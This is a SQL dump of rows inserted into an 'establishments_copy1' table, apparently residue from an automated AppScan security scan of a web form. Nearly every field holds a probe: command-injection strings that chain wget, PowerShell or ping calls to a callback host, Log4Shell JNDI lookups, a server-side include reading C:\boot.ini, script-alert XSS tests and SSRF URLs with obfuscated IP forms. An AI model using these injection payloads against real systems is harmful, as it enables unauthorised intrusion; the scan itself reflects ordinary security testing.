INSERT INTO `establishments_copy1` VALUES (207, '1234', '1234 || wget http://192.168.56.1:54388/AppScanMsg.html?varId=3153', '1', NULL, '1', '2023-01-17 10:27:09', '2023-01-17 10:27:09', NULL);
INSERT INTO `establishments_copy1` VALUES (208, '1234 && wget http://192.168.56.1:54388/AppScanMsg.html?varId=3155', '1234', '1', NULL, '1', '2023-01-17 10:27:09', '2023-01-17 10:27:09', NULL);
INSERT INTO `establishments_copy1` VALUES (209, '1234', 'ping -c 1 v3-ping-3156-e469812b-a13e-4e3e-b9a8-84ae5cd3a140.securityip.appsechcl.com', '1', NULL, '1', '2023-01-17 10:27:09', '2023-01-17 10:27:09', NULL);
INSERT INTO `establishments_copy1` VALUES (210, '1234', '1234||powershell -command Invoke-WebRequest http://192.168.56.1:54388/AppScanMsg.html?varId=3157', '1', NULL, '1', '2023-01-17 10:27:10', '2023-01-17 10:27:10', NULL);
INSERT INTO `establishments_copy1` VALUES (211, '1234||powershell -command Invoke-WebRequest http://192.168.56.1:54388/AppScanMsg.html?varId=3158', '1234', '1', NULL, '1', '2023-01-17 10:27:10', '2023-01-17 10:27:10', NULL);
INSERT INTO `establishments_copy1` VALUES (212, '1234 || wget http://192.168.56.1:54388/AppScanMsg.html?varId=3159', '1234', '1', NULL, '1', '2023-01-17 10:27:10', '2023-01-17 10:27:10', NULL);
INSERT INTO `establishments_copy1` VALUES (213, '1234', '1234 $(wget http://192.168.56.1:54388/AppScanMsg.html?varId=3161)', '1', NULL, '1', '2023-01-17 10:27:10', '2023-01-17 10:27:10', NULL);
INSERT INTO `establishments_copy1` VALUES (214, '1234', '1234\"powershell -command Invoke-WebRequest http://192.168.56.1:54388/AppScanMsg.html?varId=3162#', '1', NULL, '1', '2023-01-17 10:27:10', '2023-01-17 10:27:10', NULL);
INSERT INTO `establishments_copy1` VALUES (215, '1234', '1234 & ping -c 1 v3-ping-3163-e469812b-a13e-4e3e-b9a8-84ae5cd3a140.securityip.appsechcl.com', '1', NULL, '1', '2023-01-17 10:27:10', '2023-01-17 10:27:10', NULL);
INSERT INTO `establishments_copy1` VALUES (216, '1234\"powershell -command Invoke-WebRequest http://192.168.56.1:54388/AppScanMsg.html?varId=3165#', '1234', '1', NULL, '1', '2023-01-17 10:27:10', '2023-01-17 10:27:10', NULL);
INSERT INTO `establishments_copy1` VALUES (217, '1234 $(wget http://192.168.56.1:54388/AppScanMsg.html?varId=3167)', '1234', '1', NULL, '1', '2023-01-17 10:27:10', '2023-01-17 10:27:10', NULL);
INSERT INTO `establishments_copy1` VALUES (218, '1234', '1234\'powershell -command Invoke-WebRequest http://192.168.56.1:54388/AppScanMsg.html?varId=3166#', '1', NULL, '1', '2023-01-17 10:27:10', '2023-01-17 10:27:10', NULL);
INSERT INTO `establishments_copy1` VALUES (219, '1234', '1234 \" wget http://192.168.56.1:54388/AppScanMsg.html?varId=3168 #', '1', NULL, '1', '2023-01-17 10:27:10', '2023-01-17 10:27:10', NULL);
INSERT INTO `establishments_copy1` VALUES (220, '1234', '1234 && ping -c 1 v3-ping-3170-e469812b-a13e-4e3e-b9a8-84ae5cd3a140.securityip.appsechcl.com', '1', NULL, '1', '2023-01-17 10:27:10', '2023-01-17 10:27:10', NULL);
INSERT INTO `establishments_copy1` VALUES (221, '1234\'powershell -command Invoke-WebRequest http://192.168.56.1:54388/AppScanMsg.html?varId=3171#', '1234', '1', NULL, '1', '2023-01-17 10:27:10', '2023-01-17 10:27:10', NULL);
INSERT INTO `establishments_copy1` VALUES (222, 'ping -c 1 v3-ping-3172-1d75147e-37b9-40f2-8768-35e8e91fb545.securityip.appsechcl.com', '1234', '1', NULL, '1', '2023-01-17 10:27:10', '2023-01-17 10:27:10', NULL);
INSERT INTO `establishments_copy1` VALUES (223, '1234', '1234>(powershell -command Invoke-WebRequest http://192.168.56.1:54388/AppScanMsg.html?varId=3174)', '1', NULL, '1', '2023-01-17 10:27:10', '2023-01-17 10:27:10', NULL);
INSERT INTO `establishments_copy1` VALUES (224, '1234 \" wget http://192.168.56.1:54388/AppScanMsg.html?varId=3175 #', '1234', '1', NULL, '1', '2023-01-17 10:27:10', '2023-01-17 10:27:10', NULL);
INSERT INTO `establishments_copy1` VALUES (225, '1234', '1234 | ping -c 1 v3-ping-3178-e469812b-a13e-4e3e-b9a8-84ae5cd3a140.securityip.appsechcl.com', '1', NULL, '1', '2023-01-17 10:27:10', '2023-01-17 10:27:10', NULL);
INSERT INTO `establishments_copy1` VALUES (226, '1234', '1234 \' wget http://192.168.56.1:54388/AppScanMsg.html?varId=3177 #', '1', NULL, '1', '2023-01-17 10:27:10', '2023-01-17 10:27:10', NULL);
INSERT INTO `establishments_copy1` VALUES (227, '1234>(powershell -command Invoke-WebRequest http://192.168.56.1:54388/AppScanMsg.html?varId=3179)', '1234', '1', NULL, '1', '2023-01-17 10:27:10', '2023-01-17 10:27:10', NULL);
INSERT INTO `establishments_copy1` VALUES (228, '1234 & ping -c 1 v3-ping-3180-1d75147e-37b9-40f2-8768-35e8e91fb545.securityip.appsechcl.com', '1234', '1', NULL, '1', '2023-01-17 10:27:10', '2023-01-17 10:27:10', NULL);
INSERT INTO `establishments_copy1` VALUES (229, '1234', '1234<(powershell -command Invoke-WebRequest http://192.168.56.1:54388/AppScanMsg.html?varId=3182)', '1', NULL, '1', '2023-01-17 10:27:10', '2023-01-17 10:27:10', NULL);
INSERT INTO `establishments_copy1` VALUES (230, '1234', '1234 ; ping -c 1 v3-ping-3184-e469812b-a13e-4e3e-b9a8-84ae5cd3a140.securityip.appsechcl.com', '1', NULL, '1', '2023-01-17 10:27:10', '2023-01-17 10:27:10', NULL);
INSERT INTO `establishments_copy1` VALUES (231, '1234 \' wget http://192.168.56.1:54388/AppScanMsg.html?varId=3183 #', '1234', '1', NULL, '1', '2023-01-17 10:27:10', '2023-01-17 10:27:10', NULL);
INSERT INTO `establishments_copy1` VALUES (232, '1234', '1234 >(wget http://192.168.56.1:54388/AppScanMsg.html?varId=3185)', '1', NULL, '1', '2023-01-17 10:27:10', '2023-01-17 10:27:10', NULL);
INSERT INTO `establishments_copy1` VALUES (233, '1234<(powershell -command Invoke-WebRequest http://192.168.56.1:54388/AppScanMsg.html?varId=3186)', '1234', '1', NULL, '1', '2023-01-17 10:27:10', '2023-01-17 10:27:10', NULL);
INSERT INTO `establishments_copy1` VALUES (234, '1234 && ping -c 1 v3-ping-3188-1d75147e-37b9-40f2-8768-35e8e91fb545.securityip.appsechcl.com', '1234', '1', NULL, '1', '2023-01-17 10:27:10', '2023-01-17 10:27:10', NULL);
INSERT INTO `establishments_copy1` VALUES (235, '1234', '1234)(powershell -command Invoke-WebRequest http://192.168.56.1:54388/AppScanMsg.html?varId=3190)', '1', NULL, '1', '2023-01-17 10:27:10', '2023-01-17 10:27:10', NULL);
INSERT INTO `establishments_copy1` VALUES (236, '1234', '1234 || ping -c 1 v3-ping-3191-e469812b-a13e-4e3e-b9a8-84ae5cd3a140.securityip.appsechcl.com', '1', NULL, '1', '2023-01-17 10:27:10', '2023-01-17 10:27:10', NULL);
INSERT INTO `establishments_copy1` VALUES (237, '1234', '1234 <(wget http://192.168.56.1:54388/AppScanMsg.html?varId=3193)', '1', NULL, '1', '2023-01-17 10:27:10', '2023-01-17 10:27:10', NULL);
INSERT INTO `establishments_copy1` VALUES (238, '1234 >(wget http://192.168.56.1:54388/AppScanMsg.html?varId=3192)', '1234', '1', NULL, '1', '2023-01-17 10:27:10', '2023-01-17 10:27:10', NULL);
INSERT INTO `establishments_copy1` VALUES (239, '1234)(powershell -command Invoke-WebRequest http://192.168.56.1:54388/AppScanMsg.html?varId=3194)', '1234', '1', NULL, '1', '2023-01-17 10:27:10', '2023-01-17 10:27:10', NULL);
INSERT INTO `establishments_copy1` VALUES (240, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:10', '2023-01-17 10:27:10', NULL);
INSERT INTO `establishments_copy1` VALUES (241, '1234 | ping -c 1 v3-ping-3196-1d75147e-37b9-40f2-8768-35e8e91fb545.securityip.appsechcl.com', '1234', '1', NULL, '1', '2023-01-17 10:27:10', '2023-01-17 10:27:10', NULL);
INSERT INTO `establishments_copy1` VALUES (242, '1234', '1234 \" ping -c 1 v3-ping-3198-e469812b-a13e-4e3e-b9a8-84ae5cd3a140.securityip.appsechcl.com #', '1', NULL, '1', '2023-01-17 10:27:10', '2023-01-17 10:27:10', NULL);
INSERT INTO `establishments_copy1` VALUES (243, '1234', 'wget%20http%3A%2F%2F192.168.56.1%3A54388%2FAppScanMsg.html%3FvarId%3D3199', '1', NULL, '1', '2023-01-17 10:27:10', '2023-01-17 10:27:10', NULL);
INSERT INTO `establishments_copy1` VALUES (244, '1234 <(wget http://192.168.56.1:54388/AppScanMsg.html?varId=3200)', '1234', '1', NULL, '1', '2023-01-17 10:27:10', '2023-01-17 10:27:10', NULL);
INSERT INTO `establishments_copy1` VALUES (245, '1234 ; ping -c 1 v3-ping-3201-1d75147e-37b9-40f2-8768-35e8e91fb545.securityip.appsechcl.com', '1234', '1', NULL, '1', '2023-01-17 10:27:11', '2023-01-17 10:27:11', NULL);
INSERT INTO `establishments_copy1` VALUES (246, '1234', '1234 \' ping -c 1 v3-ping-3202-e469812b-a13e-4e3e-b9a8-84ae5cd3a140.securityip.appsechcl.com #', '1', NULL, '1', '2023-01-17 10:27:11', '2023-01-17 10:27:11', NULL);
INSERT INTO `establishments_copy1` VALUES (247, 'wget%20http%3A%2F%2F192.168.56.1%3A54388%2FAppScanMsg.html%3FvarId%3D3206', '1234', '1', NULL, '1', '2023-01-17 10:27:11', '2023-01-17 10:27:11', NULL);
INSERT INTO `establishments_copy1` VALUES (248, '1234', '1234%3Bwget%20http%3A%2F%2F192.168.56.1%3A54388%2FAppScanMsg.html%3FvarId%3D3207', '1', NULL, '1', '2023-01-17 10:27:11', '2023-01-17 10:27:11', NULL);
INSERT INTO `establishments_copy1` VALUES (249, '1234', '1234 >(ping -c 1 v3-ping-3208-e469812b-a13e-4e3e-b9a8-84ae5cd3a140.securityip.appsechcl.com)', '1', NULL, '1', '2023-01-17 10:27:11', '2023-01-17 10:27:11', NULL);
INSERT INTO `establishments_copy1` VALUES (250, '1234 || ping -c 1 v3-ping-3209-1d75147e-37b9-40f2-8768-35e8e91fb545.securityip.appsechcl.com', '1234', '1', NULL, '1', '2023-01-17 10:27:11', '2023-01-17 10:27:11', NULL);
INSERT INTO `establishments_copy1` VALUES (251, '1234%3Bwget%20http%3A%2F%2F192.168.56.1%3A54388%2FAppScanMsg.html%3FvarId%3D3211', '1234', '1', NULL, '1', '2023-01-17 10:27:11', '2023-01-17 10:27:11', NULL);
INSERT INTO `establishments_copy1` VALUES (252, '1234', '1234%7Cwget%20http%3A%2F%2F192.168.56.1%3A54388%2FAppScanMsg.html%3FvarId%3D3212', '1', NULL, '1', '2023-01-17 10:27:11', '2023-01-17 10:27:11', NULL);
INSERT INTO `establishments_copy1` VALUES (253, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:11', '2023-01-17 10:27:11', NULL);
INSERT INTO `establishments_copy1` VALUES (254, '1234', '1234 <(ping -c 1 v3-ping-3215-e469812b-a13e-4e3e-b9a8-84ae5cd3a140.securityip.appsechcl.com)', '1', NULL, '1', '2023-01-17 10:27:11', '2023-01-17 10:27:11', NULL);
INSERT INTO `establishments_copy1` VALUES (255, '1234%7Cwget%20http%3A%2F%2F192.168.56.1%3A54388%2FAppScanMsg.html%3FvarId%3D3216', '1234', '1', NULL, '1', '2023-01-17 10:27:11', '2023-01-17 10:27:11', NULL);
INSERT INTO `establishments_copy1` VALUES (256, '1234', '1234%26wget%20http%3A%2F%2F192.168.56.1%3A54388%2FAppScanMsg.html%3FvarId%3D3217', '1', NULL, '1', '2023-01-17 10:27:11', '2023-01-17 10:27:11', NULL);
INSERT INTO `establishments_copy1` VALUES (257, '1234 \" ping -c 1 v3-ping-3218-1d75147e-37b9-40f2-8768-35e8e91fb545.securityip.appsechcl.com #', '1234', '1', NULL, '1', '2023-01-17 10:27:11', '2023-01-17 10:27:11', NULL);
INSERT INTO `establishments_copy1` VALUES (258, '1234', '1234 $(ping -c 1 v3-ping-3221-e469812b-a13e-4e3e-b9a8-84ae5cd3a140.securityip.appsechcl.com)', '1', NULL, '1', '2023-01-17 10:27:11', '2023-01-17 10:27:11', NULL);
INSERT INTO `establishments_copy1` VALUES (259, '1234%26wget%20http%3A%2F%2F192.168.56.1%3A54388%2FAppScanMsg.html%3FvarId%3D3223', '1234', '1', NULL, '1', '2023-01-17 10:27:11', '2023-01-17 10:27:11', NULL);
INSERT INTO `establishments_copy1` VALUES (260, '1234', '1234%60wget%20http%3A%2F%2F192.168.56.1%3A54388%2FAppScanMsg.html%3FvarId%3D3224%60', '1', NULL, '1', '2023-01-17 10:27:11', '2023-01-17 10:27:11', NULL);
INSERT INTO `establishments_copy1` VALUES (261, '1234 \' ping -c 1 v3-ping-3225-1d75147e-37b9-40f2-8768-35e8e91fb545.securityip.appsechcl.com #', '1234', '1', NULL, '1', '2023-01-17 10:27:11', '2023-01-17 10:27:11', NULL);
INSERT INTO `establishments_copy1` VALUES (262, '1234', '1234 `ping -c 1 v3-ping-3227-e469812b-a13e-4e3e-b9a8-84ae5cd3a140.securityip.appsechcl.com`', '1', NULL, '1', '2023-01-17 10:27:11', '2023-01-17 10:27:11', NULL);
INSERT INTO `establishments_copy1` VALUES (263, '1234', '1234%26%26wget%20http%3A%2F%2F192.168.56.1%3A54388%2FAppScanMsg.html%3FvarId%3D3229', '1', NULL, '1', '2023-01-17 10:27:11', '2023-01-17 10:27:11', NULL);
INSERT INTO `establishments_copy1` VALUES (264, '1234%60wget%20http%3A%2F%2F192.168.56.1%3A54388%2FAppScanMsg.html%3FvarId%3D3228%60', '1234', '1', NULL, '1', '2023-01-17 10:27:11', '2023-01-17 10:27:11', NULL);
INSERT INTO `establishments_copy1` VALUES (265, '1234 >(ping -c 1 v3-ping-3231-1d75147e-37b9-40f2-8768-35e8e91fb545.securityip.appsechcl.com)', '1234', '1', NULL, '1', '2023-01-17 10:27:11', '2023-01-17 10:27:11', NULL);
INSERT INTO `establishments_copy1` VALUES (266, '1234', '1234 )(ping -c 1 v3-ping-3233-e469812b-a13e-4e3e-b9a8-84ae5cd3a140.securityip.appsechcl.com)', '1', NULL, '1', '2023-01-17 10:27:11', '2023-01-17 10:27:11', NULL);
INSERT INTO `establishments_copy1` VALUES (267, '1234', '1234%7C%7Cwget%20http%3A%2F%2F192.168.56.1%3A54388%2FAppScanMsg.html%3FvarId%3D3234', '1', NULL, '1', '2023-01-17 10:27:12', '2023-01-17 10:27:12', NULL);
INSERT INTO `establishments_copy1` VALUES (268, '1234%26%26wget%20http%3A%2F%2F192.168.56.1%3A54388%2FAppScanMsg.html%3FvarId%3D3235', '1234', '1', NULL, '1', '2023-01-17 10:27:12', '2023-01-17 10:27:12', NULL);
INSERT INTO `establishments_copy1` VALUES (269, '1234 <(ping -c 1 v3-ping-3238-1d75147e-37b9-40f2-8768-35e8e91fb545.securityip.appsechcl.com)', '1234', '1', NULL, '1', '2023-01-17 10:27:12', '2023-01-17 10:27:12', NULL);
INSERT INTO `establishments_copy1` VALUES (270, '1234', '1234$(wget%20http%3A%2F%2F192.168.56.1%3A54388%2FAppScanMsg.html%3FvarId%3D3239)', '1', NULL, '1', '2023-01-17 10:27:12', '2023-01-17 10:27:12', NULL);
INSERT INTO `establishments_copy1` VALUES (271, '1234%7C%7Cwget%20http%3A%2F%2F192.168.56.1%3A54388%2FAppScanMsg.html%3FvarId%3D3240', '1234', '1', NULL, '1', '2023-01-17 10:27:12', '2023-01-17 10:27:12', NULL);
INSERT INTO `establishments_copy1` VALUES (272, '1234 $(ping -c 1 v3-ping-3243-1d75147e-37b9-40f2-8768-35e8e91fb545.securityip.appsechcl.com)', '1234', '1', NULL, '1', '2023-01-17 10:27:12', '2023-01-17 10:27:12', NULL);
INSERT INTO `establishments_copy1` VALUES (273, '1234$(wget%20http%3A%2F%2F192.168.56.1%3A54388%2FAppScanMsg.html%3FvarId%3D3244)', '1234', '1', NULL, '1', '2023-01-17 10:27:12', '2023-01-17 10:27:12', NULL);
INSERT INTO `establishments_copy1` VALUES (274, '1234', '1234%5C%22wget%20http%3A%2F%2F192.168.56.1%3A54388%2FAppScanMsg.html%3FvarId%3D3245%23', '1', NULL, '1', '2023-01-17 10:27:12', '2023-01-17 10:27:12', NULL);
INSERT INTO `establishments_copy1` VALUES (275, '1234 `ping -c 1 v3-ping-3247-1d75147e-37b9-40f2-8768-35e8e91fb545.securityip.appsechcl.com`', '1234', '1', NULL, '1', '2023-01-17 10:27:12', '2023-01-17 10:27:12', NULL);
INSERT INTO `establishments_copy1` VALUES (276, '1234%5C%22wget%20http%3A%2F%2F192.168.56.1%3A54388%2FAppScanMsg.html%3FvarId%3D3248%23', '1234', '1', NULL, '1', '2023-01-17 10:27:12', '2023-01-17 10:27:12', NULL);
INSERT INTO `establishments_copy1` VALUES (277, '1234', '1234\'wget%20http%3A%2F%2F192.168.56.1%3A54388%2FAppScanMsg.html%3FvarId%3D3249%23', '1', NULL, '1', '2023-01-17 10:27:12', '2023-01-17 10:27:12', NULL);
INSERT INTO `establishments_copy1` VALUES (278, '1234 )(ping -c 1 v3-ping-3251-1d75147e-37b9-40f2-8768-35e8e91fb545.securityip.appsechcl.com)', '1234', '1', NULL, '1', '2023-01-17 10:27:12', '2023-01-17 10:27:12', NULL);
INSERT INTO `establishments_copy1` VALUES (279, '1234\'wget%20http%3A%2F%2F192.168.56.1%3A54388%2FAppScanMsg.html%3FvarId%3D3252%23', '1234', '1', NULL, '1', '2023-01-17 10:27:12', '2023-01-17 10:27:12', NULL);
INSERT INTO `establishments_copy1` VALUES (280, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:12', '2023-01-17 10:27:12', NULL);
INSERT INTO `establishments_copy1` VALUES (281, '1234', '1234%3E(wget%20http%3A%2F%2F192.168.56.1%3A54388%2FAppScanMsg.html%3FvarId%3D3253)', '1', NULL, '1', '2023-01-17 10:27:12', '2023-01-17 10:27:12', NULL);
INSERT INTO `establishments_copy1` VALUES (282, '1234%3E(wget%20http%3A%2F%2F192.168.56.1%3A54388%2FAppScanMsg.html%3FvarId%3D3257)', '1234', '1', NULL, '1', '2023-01-17 10:27:12', '2023-01-17 10:27:12', NULL);
INSERT INTO `establishments_copy1` VALUES (283, '1234', '1234%3C(wget%20http%3A%2F%2F192.168.56.1%3A54388%2FAppScanMsg.html%3FvarId%3D3259)', '1', NULL, '1', '2023-01-17 10:27:12', '2023-01-17 10:27:12', NULL);
INSERT INTO `establishments_copy1` VALUES (284, '1234%3C(wget%20http%3A%2F%2F192.168.56.1%3A54388%2FAppScanMsg.html%3FvarId%3D3263)', '1234', '1', NULL, '1', '2023-01-17 10:27:13', '2023-01-17 10:27:13', NULL);
INSERT INTO `establishments_copy1` VALUES (285, '1234', '<!--#include file=\"C:\\boot.ini\"-->', '1', NULL, '1', '2023-01-17 10:27:18', '2023-01-17 10:27:18', NULL);
INSERT INTO `establishments_copy1` VALUES (286, '<!--#include file=\"C:\\boot.ini\"-->', '1234', '1', NULL, '1', '2023-01-17 10:27:18', '2023-01-17 10:27:18', NULL);
INSERT INTO `establishments_copy1` VALUES (287, '1234', '${jndi:ldap://v3-ping-3423-1d75147e-37b9-40f2-8768-35e8e91fb545.securityip.appsechcl.com/foo}', '1', NULL, '1', '2023-01-17 10:27:19', '2023-01-17 10:27:19', NULL);
INSERT INTO `establishments_copy1` VALUES (288, '${jndi:ldap://v3-ping-3426-738786e9-9250-4b12-9262-ce766a2ebdbe.securityip.appsechcl.com/foo}', '1234', '1', NULL, '1', '2023-01-17 10:27:19', '2023-01-17 10:27:19', NULL);
INSERT INTO `establishments_copy1` VALUES (289, '1234', '${jndi:ldap://v3-ping-3428-1d75147e-37b9-40f2-8768-35e8e91fb545.securityip.appsechcl.com/foo}', '1', NULL, '1', '2023-01-17 10:27:19', '2023-01-17 10:27:19', NULL);
INSERT INTO `establishments_copy1` VALUES (290, '${jndi:ldap://v3-ping-3431-738786e9-9250-4b12-9262-ce766a2ebdbe.securityip.appsechcl.com/foo}', '1234', '1', NULL, '1', '2023-01-17 10:27:19', '2023-01-17 10:27:19', NULL);
INSERT INTO `establishments_copy1` VALUES (291, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:26', '2023-01-17 10:27:26', NULL);
INSERT INTO `establishments_copy1` VALUES (292, '1234', '1234ywdtprobejq00014Ayw', '1', NULL, '1', '2023-01-17 10:27:26', '2023-01-17 10:27:26', NULL);
INSERT INTO `establishments_copy1` VALUES (293, '1234ywdtprobejq00014Byw', '1234', '1', NULL, '1', '2023-01-17 10:27:27', '2023-01-17 10:27:27', NULL);
INSERT INTO `establishments_copy1` VALUES (294, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:27', '2023-01-17 10:27:27', NULL);
INSERT INTO `establishments_copy1` VALUES (295, '1234ywdtprobejq00014Byw', '1234', '1', NULL, '1', '2023-01-17 10:27:27', '2023-01-17 10:27:27', NULL);
INSERT INTO `establishments_copy1` VALUES (296, '1234yw<script>alert(332)</script>yw', '1234', '1', NULL, '1', '2023-01-17 10:27:30', '2023-01-17 10:27:30', NULL);
INSERT INTO `establishments_copy1` VALUES (297, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:30', '2023-01-17 10:27:30', NULL);
INSERT INTO `establishments_copy1` VALUES (298, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:31', '2023-01-17 10:27:31', NULL);
INSERT INTO `establishments_copy1` VALUES (299, '1234', 'http://192.168.56.1:54388/AppScanMsg.html?varId=3600', '1', NULL, '1', '2023-01-17 10:27:31', '2023-01-17 10:27:31', NULL);
INSERT INTO `establishments_copy1` VALUES (300, '1234', 'http://3232249857:54388/AppScanMsg.html?varId=3601', '1', NULL, '1', '2023-01-17 10:27:31', '2023-01-17 10:27:31', NULL);
INSERT INTO `establishments_copy1` VALUES (301, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:31', '2023-01-17 10:27:31', NULL);
INSERT INTO `establishments_copy1` VALUES (302, 'http://192.168.56.1:54388/AppScanMsg.html?varId=3602', '1234', '1', NULL, '1', '2023-01-17 10:27:31', '2023-01-17 10:27:31', NULL);
INSERT INTO `establishments_copy1` VALUES (303, '1234', 'http://0x00C0.0x0000A8.0x038.0x0000001:54388/AppScanMsg.html?varId=3604', '1', NULL, '1', '2023-01-17 10:27:31', '2023-01-17 10:27:31', NULL);
INSERT INTO `establishments_copy1` VALUES (304, 'http://3232249857:54388/AppScanMsg.html?varId=3605', '1234', '1', NULL, '1', '2023-01-17 10:27:31', '2023-01-17 10:27:31', NULL);
INSERT INTO `establishments_copy1` VALUES (305, '1234', 'http://0xC0A83801:54388/AppScanMsg.html?varId=3606', '1', NULL, '1', '2023-01-17 10:27:31', '2023-01-17 10:27:31', NULL);
INSERT INTO `establishments_copy1` VALUES (306, '1234yw<script>alert(333)</script>yw', '1234', '1', NULL, '1', '2023-01-17 10:27:31', '2023-01-17 10:27:31', NULL);
INSERT INTO `establishments_copy1` VALUES (307, 'http://0x00C0.0x0000A8.0x038.0x0000001:54388/AppScanMsg.html?varId=3607', '1234', '1', NULL, '1', '2023-01-17 10:27:31', '2023-01-17 10:27:31', NULL);
INSERT INTO `establishments_copy1` VALUES (308, '1234', 'http://000300.000000250.0000070.00001:54388/AppScanMsg.html?varId=3608', '1', NULL, '1', '2023-01-17 10:27:31', '2023-01-17 10:27:31', NULL);
INSERT INTO `establishments_copy1` VALUES (309, 'http://0xC0A83801:54388/AppScanMsg.html?varId=3610', '1234', '1', NULL, '1', '2023-01-17 10:27:32', '2023-01-17 10:27:32', NULL);
INSERT INTO `establishments_copy1` VALUES (310, '1234', '\'', '1', NULL, '1', '2023-01-17 10:27:32', '2023-01-17 10:27:32', NULL);
INSERT INTO `establishments_copy1` VALUES (311, '\'', '1234', '1', NULL, '1', '2023-01-17 10:27:32', '2023-01-17 10:27:32', NULL);
INSERT INTO `establishments_copy1` VALUES (312, '1234', 'http://0000030052034001:54388/AppScanMsg.html?varId=3611', '1', NULL, '1', '2023-01-17 10:27:32', '2023-01-17 10:27:32', NULL);
INSERT INTO `establishments_copy1` VALUES (313, 'http://000300.000000250.0000070.00001:54388/AppScanMsg.html?varId=3612', '1234', '1', NULL, '1', '2023-01-17 10:27:32', '2023-01-17 10:27:32', NULL);
INSERT INTO `establishments_copy1` VALUES (314, '1234', '\\\'', '1', NULL, '1', '2023-01-17 10:27:32', '2023-01-17 10:27:32', NULL);
INSERT INTO `establishments_copy1` VALUES (315, '\\\'', '1234', '1', NULL, '1', '2023-01-17 10:27:32', '2023-01-17 10:27:32', NULL);
INSERT INTO `establishments_copy1` VALUES (316, '1234', 'http://0xC0.168.000000070.0x00001:54388/AppScanMsg.html?varId=3613', '1', NULL, '1', '2023-01-17 10:27:32', '2023-01-17 10:27:32', NULL);
INSERT INTO `establishments_copy1` VALUES (317, '1234', ';', '1', NULL, '1', '2023-01-17 10:27:32', '2023-01-17 10:27:32', NULL);
INSERT INTO `establishments_copy1` VALUES (318, 'http://0000030052034001:54388/AppScanMsg.html?varId=3614', '1234', '1', NULL, '1', '2023-01-17 10:27:32', '2023-01-17 10:27:32', NULL);
INSERT INTO `establishments_copy1` VALUES (319, ';', '1234', '1', NULL, '1', '2023-01-17 10:27:32', '2023-01-17 10:27:32', NULL);
INSERT INTO `establishments_copy1` VALUES (320, '1234', 'http://7527217153:54388/AppScanMsg.html?varId=3615', '1', NULL, '1', '2023-01-17 10:27:32', '2023-01-17 10:27:32', NULL);
INSERT INTO `establishments_copy1` VALUES (321, '1234', '\"', '1', NULL, '1', '2023-01-17 10:27:32', '2023-01-17 10:27:32', NULL);
INSERT INTO `establishments_copy1` VALUES (322, '\"', '1234', '1', NULL, '1', '2023-01-17 10:27:32', '2023-01-17 10:27:32', NULL);
INSERT INTO `establishments_copy1` VALUES (323, 'http://0xC0.168.000000070.0x00001:54388/AppScanMsg.html?varId=3616', '1234', '1', NULL, '1', '2023-01-17 10:27:32', '2023-01-17 10:27:32', NULL);
INSERT INTO `establishments_copy1` VALUES (324, '1234', '\\\"', '1', NULL, '1', '2023-01-17 10:27:32', '2023-01-17 10:27:32', NULL);
INSERT INTO `establishments_copy1` VALUES (325, '\\\"', '1234', '1', NULL, '1', '2023-01-17 10:27:32', '2023-01-17 10:27:32', NULL);
INSERT INTO `establishments_copy1` VALUES (326, 'http://7527217153:54388/AppScanMsg.html?varId=3618', '1234', '1', NULL, '1', '2023-01-17 10:27:32', '2023-01-17 10:27:32', NULL);
INSERT INTO `establishments_copy1` VALUES (327, '1234', ')', '1', NULL, '1', '2023-01-17 10:27:32', '2023-01-17 10:27:32', NULL);
INSERT INTO `establishments_copy1` VALUES (328, ')', '1234', '1', NULL, '1', '2023-01-17 10:27:32', '2023-01-17 10:27:32', NULL);
INSERT INTO `establishments_copy1` VALUES (329, '1234ywdtprobejq00014E<dtprobejq00014Eyw', '1234', '1', NULL, '1', '2023-01-17 10:27:33', '2023-01-17 10:27:33', NULL);
INSERT INTO `establishments_copy1` VALUES (330, '1234', '99999999999999999999', '1', NULL, '1', '2023-01-17 10:27:33', '2023-01-17 10:27:33', NULL);
INSERT INTO `establishments_copy1` VALUES (331, '1234yw<script>alert(335)</script>yw', '1234', '1', NULL, '1', '2023-01-17 10:27:33', '2023-01-17 10:27:33', NULL);
INSERT INTO `establishments_copy1` VALUES (332, '1234', '-99999999999999999999', '1', NULL, '1', '2023-01-17 10:27:33', '2023-01-17 10:27:33', NULL);
INSERT INTO `establishments_copy1` VALUES (333, '99999999999999999999', '1234', '1', NULL, '1', '2023-01-17 10:27:33', '2023-01-17 10:27:33', NULL);
INSERT INTO `establishments_copy1` VALUES (334, '-99999999999999999999', '1234', '1', NULL, '1', '2023-01-17 10:27:33', '2023-01-17 10:27:33', NULL);
INSERT INTO `establishments_copy1` VALUES (335, '1234', '4294967297', '1', NULL, '1', '2023-01-17 10:27:33', '2023-01-17 10:27:33', NULL);
INSERT INTO `establishments_copy1` VALUES (336, '1234', '18446744073709551617', '1', NULL, '1', '2023-01-17 10:27:33', '2023-01-17 10:27:33', NULL);
INSERT INTO `establishments_copy1` VALUES (337, '4294967297', '1234', '1', NULL, '1', '2023-01-17 10:27:33', '2023-01-17 10:27:33', NULL);
INSERT INTO `establishments_copy1` VALUES (338, '18446744073709551617', '1234', '1', NULL, '1', '2023-01-17 10:27:34', '2023-01-17 10:27:34', NULL);
INSERT INTO `establishments_copy1` VALUES (339, '1234', '1234#', '1', NULL, '1', '2023-01-17 10:27:34', '2023-01-17 10:27:34', NULL);
INSERT INTO `establishments_copy1` VALUES (340, '1234', '1234&', '1', NULL, '1', '2023-01-17 10:27:34', '2023-01-17 10:27:34', NULL);
INSERT INTO `establishments_copy1` VALUES (341, 'ywdtprobejq00014Byw', '1234', '1', NULL, '1', '2023-01-17 10:27:34', '2023-01-17 10:27:34', NULL);
INSERT INTO `establishments_copy1` VALUES (342, '1234#', '1234', '1', NULL, '1', '2023-01-17 10:27:34', '2023-01-17 10:27:34', NULL);
INSERT INTO `establishments_copy1` VALUES (343, '1234', '1234<', '1', NULL, '1', '2023-01-17 10:27:34', '2023-01-17 10:27:34', NULL);
INSERT INTO `establishments_copy1` VALUES (344, '1234&', '1234', '1', NULL, '1', '2023-01-17 10:27:34', '2023-01-17 10:27:34', NULL);
INSERT INTO `establishments_copy1` VALUES (345, 'ywdtprobejq00014Byw', '1234', '1', NULL, '1', '2023-01-17 10:27:34', '2023-01-17 10:27:34', NULL);
